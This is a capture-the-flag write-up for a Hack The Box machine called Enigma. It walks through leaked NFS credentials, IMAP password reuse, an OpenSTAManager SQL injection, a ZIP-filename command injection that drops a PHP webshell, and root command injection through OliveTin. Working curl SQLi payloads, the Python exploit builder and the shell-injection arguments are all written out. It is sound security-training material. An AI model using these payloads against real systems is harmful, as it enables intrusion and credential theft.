# Enigma

## Engagement Notes

Enigma is a Linux box that never asks for a single hard exploit — it asks for
patience with the boring stuff. Every credential on the chain up to root comes
from either a file that shouldn't have been world-readable or a password that
got reused one hop too many; the only two "real" bugs are a public CVE PoC that
got adapted almost verbatim, and a locally-bound admin panel that turned out to
be an RCE-as-a-service by design. It rewards the habit of trying the obvious
thing (mount the NFS share, reuse the password, curl the unfamiliar localhost
port) before reaching for anything clever.

## Attack path

1. **Recon** → NFS export `/srv/nfs/onboarding` is world-readable; pulls a PDF
   with onboarding webmail creds for a new hire, `kevin`.
2. **Mailbox hopping** → `kevin`'s IMAP password is reused against `sarah` and
   also works; sarah's inbox holds OpenSTAManager admin creds from IT support.
3. **OpenSTAManager (as admin)** → `CVE-2026-24418` SQL injection in the
   `send_reminder` bulk action dumps `haris`'s bcrypt hash (a detour later found
   to be unnecessary), cracked to `bestfriends`.
4. **CVE-2025-69212** → a crafted e-invoice ZIP filename injects a shell command
   during P7M import, dropping a PHP webshell as `www-data`.
5. **User pivot** → `su haris` with the cracked password; drop an SSH key for a
   stable foothold → `user.txt`.
6. **OliveTin (root)** → `ss -tulpn` finds a management panel bound to
   `127.0.0.1:1337`; its `backup_database` action shells out on an unsanitized
   argument → command injection as root → `root.txt`.

## Enumeration

```console
$ rustscan -a enigma.htb
Open 10.129.24.151:22
Open 10.129.24.151:80
Open 10.129.24.151:111
Open 10.129.24.151:110
Open 10.129.24.151:143
Open 10.129.24.151:995
# + a spread of high RPC ports (mountd/status/nlockmgr)
```

`gobuster dir` on the main site found nothing but `index.html`; a `support`
mailto: link noticed on that page prompted a quick IMAP password-guess against
a `support` account (top common passwords + `enigma`) — no hit, dead end.
Pivoting to vhost enumeration instead:

```console
$ gobuster vhost -u http://enigma.htb -w .../subdomains-top1million-110000.txt --append-domain
mail001.enigma.htb Status: 200
```

`http://mail001.enigma.htb` is Roundcube 1.6.16 (`rcversion: 10616`). Port 111
(portmapper) was also open, so NFS got the standard "just try it and see" check:

```console
$ showmount -e enigma.htb
Export list for enigma.htb:
/srv/nfs/onboarding *

$ nfs-ls nfs://enigma.htb/srv/nfs/onboarding
-rw-r--r--  1     0     0         1751 New_Employee_Access.pdf

$ nfs-cp nfs://enigma.htb/srv/nfs/onboarding/New_Employee_Access.pdf artifacts/New_Employee_Access.pdf
```

No auth required on the export at all — anonymous read of an onboarding
document meant for a new hire, "Kevin Mitchell":

![New Employee Access PDF pulled from the anonymous NFS export, showing kevin's Roundcube webmail credentials](/assets/images/ctf/events/season11-htb-26/enigma/onboarding-pdf.png)

> 🧠 The `support` spray came from a mailto: address noticed on the site — a
> generic guess, and it went nowhere. The NFS export wasn't chased because of
> anything specific about the "onboarding" name; portmapper being open was
> reason enough to just try it and see.

## Foothold 1 — mailbox hopping to OpenSTAManager creds

`kevin` / `Enigma2024!` logs into IMAP straight away. Kevin's inbox holds
nothing but a generic welcome email — but it names `sarah@enigma.htb` as a
contact, and the same password gets tried against her account too:

```python
username = "sarah"
password = "Enigma2024!"
with IMAP4_SSL(target) as imap:
    login = imap.login(username, password)
    # Login successful: ('OK', [b'Logged in'])
```

Sarah's inbox holds a real find — an IT-support reply with OpenSTAManager
credentials:

![Sarah's Roundcube inbox showing an IT-support email with OpenSTAManager admin credentials](/assets/images/ctf/events/season11-htb-26/enigma/sarah-inbox-osm-creds.png)

> 🧠 "Always be spraying" — the reuse attempt against sarah wasn't triggered by
> anything specific in kevin's mailbox beyond her name showing up; it was
> reflexive credential reuse-testing against any account name that surfaced,
> and it paid off.

## OpenSTAManager — CVE-2026-24418 SQL injection (superseded, kept for the study value)

Logging in as `admin` on `http://support_001.enigma.htb` opened up
OpenSTAManager's admin panel. Habitually poking admin panels for injectable
parameters turned up an error-based SQL injection in the `send_reminder` bulk
action:

```console
$ curl -b cookies.txt -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(USER(),' | ',VERSION()))))%23" \
  "http://support_001.enigma.htb/actions.php?id_module=18"
# Messaggio: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~brollin@localhost | 8.0.46-0ubu'
```

Pivoting the same injection to dump another user's identity and password hash
(id 2 → `haris`), splitting the hash across two `SUBSTRING` calls because
`EXTRACTVALUE` truncates its output:

```console
$ curl -b cookies.txt -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM zz_users where id=2)))%23" ...
# '~$2y$10$WHf1T79sxjsZongUKT2jGeex'
$ curl -b cookies.txt -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,32,60) FROM zz_users where id=2)))%23" ...
# '~TkvihBQyCZeoYXmObiNphrsZDr6eC'
```

Reassembled: `$2y$10$WHf1T79sxjsZongUKT2jGeex…Dr6eC`, cracked offline:

```console
$ hashcat --show artifacts/haris.hash .../rockyou.txt.tar.gz -m 3200
$2y$10$WHf1T79sxjsZongUKT2jGeex…Dr6eC:bestfriends
```

This CVE ([lukasz-rybak/CVE-2026-24418](https://github.com/lukasz-rybak/CVE-2026-24418))
documents exactly this injection — improper validation of the `id_records[]`
array in `/modules/scadenzario/bulk.php` before it's concatenated into a SQL
`IN()` clause.

> 🧠 In the operator's own words: "Initially I just did the SQL exploit to get
> the n+1 user for admin, since I was already logged in as admin. But I also
> found the backup tool just dumped the whole database anyway." The manual SQLi
> got `haris`'s hash, but OpenSTAManager's own DB backup/export feature would
> have handed over the whole database — same destination, less work. Kept here
> because it's a real, CVE-documented bug that was actually exploited, even
> though it turned out to be the long way round.

## Foothold 2 — CVE-2025-69212: e-invoice ZIP filename → RCE

Researching "the extra password" (the bcrypt hash) surfaced
[lukasz-rybak/CVE-2025-69212](https://github.com/lukasz-rybak/CVE-2025-69212):
OpenSTAManager's P7M electronic-invoice import passes an attacker-controlled
filename straight into `exec()` without sanitizing it. The payload technique —
a ZIP entry whose filename breaks out of the openssl command it's built into —
came directly from that PoC:

```python
cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('payloads/exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

Uploaded through Sales Invoices → "Importazione FE":

![OpenSTAManager's electronic-invoice import screen showing an XML parse error after uploading the crafted ZIP](/assets/images/ctf/events/season11-htb-26/enigma/invoice-import-error.png)

The import UI itself throws — "Start tag expected, `'<'` not found," since the
ZIP's actual content is a dummy P7M, not valid XML — but the injected filename
is shelled out during extraction regardless of that later parse failure, and
the webshell lands anyway:

```console
$ curl http://support_001.enigma.htb/files/SHELL.php?c=id
```

![The dropped webshell confirming command execution as uid=33(www-data)](/assets/images/ctf/events/season11-htb-26/enigma/webshell-id.png)

> 🧠 The application error dialog is a red herring — it's the invoice-content
> XML parser failing on a dummy P7M, not a sign the exploit didn't work. The
> command injection happens earlier, at `ZipArchive::extractTo()`, before that
> parser ever runs.

## User pivot — `www-data` → `haris`

Several reverse shell payloads were tried against the webshell before one
connected. From `www-data`, `su haris` with the cracked `bestfriends` password
got a stable shell, and an SSH key was dropped for haris to avoid repeating the
webshell dance:

```console
$ ssh haris@enigma.htb -i artifacts/haris
$ whoami
haris
```

`user.txt` came from haris's home directory.

## Privilege escalation — OliveTin command injection

Local recon as haris turned up a service bound only to loopback:

```console
$ ss -tulpn
tcp   LISTEN 0      4096      127.0.0.1:1337       0.0.0.0:*
```

```console
$ curl http://localhost:1337
<title>OliveTin</title>
<meta name="description" content="Give safe and simple access to predefined shell commands from a web interface." />
```

[OliveTin](https://github.com/OliveTin/OliveTin) exposes admin-defined shell
commands ("actions") over a web UI and API. `/etc/OliveTin/config.yaml` — the
live config, not the `/opt/OliveTin/...` copy — defines a `backup_database`
action that takes `db_user`, `db_pass`, and `db_name` arguments:

![OliveTin's web dashboard listing its configured actions, including "Backup Database"](/assets/images/ctf/events/season11-htb-26/enigma/olivetin-dashboard.png)

Those arguments get interpolated unsanitized into a shell command. A command
substitution in `db_pass` proves it:

```
POST /api/olivetin.api.v1.OliveTinApiService/StartAction
{"bindingId":"backup_database","arguments":[
  {"name":"db_user","value":"backup_svc"},
  {"name":"db_pass","value":"'$(touch /opt/test)'"},
  {"name":"db_name","value":"production"}
],"uniqueTrackingId":"69a23f23-dd0b-4fe3-9443-258c73affde6"}
```

```console
$ ls -alhn /opt/test
-rw-r--r-- 1 0 0 0 Jun 28 08:20 /opt/test
```

Root-owned — OliveTin runs `backup_database` as root. The same injection reads
the root flag straight out through the file system:

```
db_pass: '$(cat /root/root.txt > /opt/root.txt)'
```

```console
$ cat /opt/root.txt
fc1b80…3592d
```

A follow-up payload copied haris's `authorized_keys` into `/root/.ssh/` for a
stable root shell over SSH.

> 🧠 By this point in the box every other localhost-bound service had already
> been enumerated or exploited — OliveTin was simply the one thing left
> untouched. And once identified, it wasn't a bug to go hunting for: "since it's
> a literal management portal, it is defined as an RCE as a service" — any
> action whose arguments reach a shell unsanitized is command injection by
> design, not by accident.

## What didn't work

- **IMAP password guessing against `support`** — a mailto: address on the main
  site suggested the account name, but the top-passwords wordlist (+`"enigma"`)
  produced no successful login. Dead end; the real webmail access came from the
  NFS-leaked PDF instead.
- **`gobuster dir` against the site root** — turned up nothing beyond
  `index.html`; had to pivot to vhost enumeration to find `mail001.enigma.htb`.
- **UDP `nmap -sU -sV`** — every high port came back `open|filtered`; no
  actionable service beyond what the RPC/TCP scans already showed.

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified against
its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Plaintext webmail creds in a PDF on the anonymous NFS export |
| Valid Accounts | [T1078](https://attack.mitre.org/techniques/T1078/) | kevin's/sarah's IMAP creds; admin creds for OpenSTAManager |
| Email Collection: Remote Email Collection | [T1114.002](https://attack.mitre.org/techniques/T1114/002/) | Reading kevin's and sarah's IMAP inboxes for further credentials |
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | CVE-2026-24418 SQLi and CVE-2025-69212 command injection, both against OpenSTAManager |
| Exploitation for Privilege Escalation | [T1068](https://attack.mitre.org/techniques/T1068/) | OliveTin `backup_database` argument injection, running as root |

> **Password Guessing** ([T1110.001](https://attack.mitre.org/techniques/T1110/001/))
> was attempted against `support` over IMAP but produced no successful login —
> not part of the working chain, so not tagged. **Password Spraying**
> ([T1110.003](https://attack.mitre.org/techniques/T1110/003/)) was considered
> for the kevin → sarah password reuse but doesn't fit: the technique requires
> "many different accounts," and only two were touched here — described above
> as plain credential reuse instead, under Valid Accounts.

## Lessons

- **Practice password spraying and enumeration** — most of this box's chain is
  reused/leaked credentials, not exploits; the two real bugs (both OpenSTAManager
  CVEs) only mattered because the recon habits (check anonymous NFS, reuse every
  password against every name) got there first.
- **An unfamiliar localhost-only port is worth curling on sight.** Once every
  other local service had been touched, OliveTin was the one thing left — and
  "a management portal that runs shell commands with your arguments" is worth
  treating as an RCE surface by default, not an afterthought.
- **A UI error doesn't mean the exploit failed** — the invoice import's XML
  parse error was a red herring; the command injection had already fired before
  that parser ran.
